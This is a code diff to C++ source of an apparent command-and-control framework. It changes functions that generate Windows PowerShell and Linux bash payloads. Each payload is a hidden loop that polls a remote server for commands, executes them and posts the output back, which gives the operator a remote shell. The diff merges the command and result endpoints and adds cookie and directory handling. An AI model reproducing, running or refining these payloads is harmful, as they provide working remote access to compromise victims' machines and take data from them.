@@ -54,20 +54,21 @@ string payload_generator_windows(const string& url) {
 
     // Generate unique endpoint names for command and result exchange
     string endpoint1 = generate_random_string(8);
-    string endpoint2 = generate_random_string(8);
+
 
     // Construct the PowerShell payload string
     string payload =
     "Start-Process $PSHOME\\powershell.exe -ArgumentList{$username=$env:USERNAME; while ($true) { try { "
     "$response = Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -ErrorAction Stop; "
-    "$command = $response.Content.Trim(); if ($command) { try { "
+    "$command = $response.Content.Trim(); "
+    "if ($command -and $command.ToLower() -ne 'exit') { try { "
     "$output = Invoke-Expression -Command $command 2>&1 | Out-String; "
     "$body = @{ Result = $output }; "
-    "try { Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint2 + "?user=$username\" -WebSession $session -Method Post -Body $body "
+    "try { Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -Method Post -Body $body "
     "-ContentType \"application/x-www-form-urlencoded\" -TimeoutSec 5 -ErrorAction Stop | Out-Null } "
     "catch [System.Net.WebException] { } catch { } } "
     "catch { $errorBody = @{ Result = 'ERROR: $_' }; "
-    "Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint2 + "?user=$username\" -WebSession $session -Method Post -Body $errorBody "
+    "Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -Method Post -Body $errorBody "
     "-ContentType \"application/x-www-form-urlencoded\" | Out-Null } } "
     "} catch [System.Net.WebException] { Start-Sleep -Seconds 1; continue } catch { } Start-Sleep -Milliseconds 500 }} -WindowStyle Hidden";
 
@@ -90,19 +91,28 @@ string payload_generator_linux(const string& url) {
 
     // Generate unique endpoint names for command and result exchange
     string endpoint1 = generate_random_string(8);
-    string endpoint2 = generate_random_string(8);
 
     // Construct the PowerShell payload string
     string payload =
-    "nohup bash -c 'USER=$(whoami); while true; do "
-    "response=$(curl -fsS \"" + clean_url + "/" + endpoint1 + "?user=$USER\"); "
-    "if [ ! -z \"$response\" ]; then "
-    "  output=$(bash -c \"$response\" 2>&1); "
-    "  curl -fsS -X POST \"" + clean_url + "/" + endpoint2 + "?user=$USER\" "
-    "  -d \"Result=$output\" --max-time 5 || true; "
+    "username=$USER; cookie=$(mktemp); cwd=$(pwd); "
+    "while true; do "
+    "cmd=$(curl -s --cookie \"$cookie\" --cookie-jar \"$cookie\" --fail \"" + clean_url + "/" + endpoint1 + "?user=$username\") || { sleep 1; continue; }; "
+    "cmd=$(echo \"$cmd\" | tr -d '\\r'); "
+    "[ -n \"$cmd\" ] && { "
+    "if [[ \"$cmd\" =~ ^cd[[:space:]]*($|~|/|\\.\\.|[^;&|]*) ]]; then "
+    "  dir=$(echo \"$cmd\" | cut -d' ' -f2-); "
+    "  if [[ -z \"$dir\" ]]; then dir=\"$HOME\"; fi; "
+    "  cd \"$cwd\" && cd \"$dir\" 2>/dev/null && cwd=$(pwd); "
+    "  output=\"Changed directory to $cwd\"; "
+    "else "
+    "  output=$(cd \"$cwd\" && bash -c \"$cmd\" 2>&1); "
     "fi; "
+    "curl -s --cookie \"$cookie\" --cookie-jar \"$cookie\" --fail -X POST "
+    "-H \"Content-Type: application/x-www-form-urlencoded\" "
+    "--data-urlencode \"Result=$output\" \"" + clean_url + "/" + endpoint1 + "?user=$username\" >/dev/null 2>&1 || true; }; "
     "sleep 0.5; "
-    "done' >/dev/null 2>&1 &";
+    "done"
+    "&";
 
     return payload;
 }
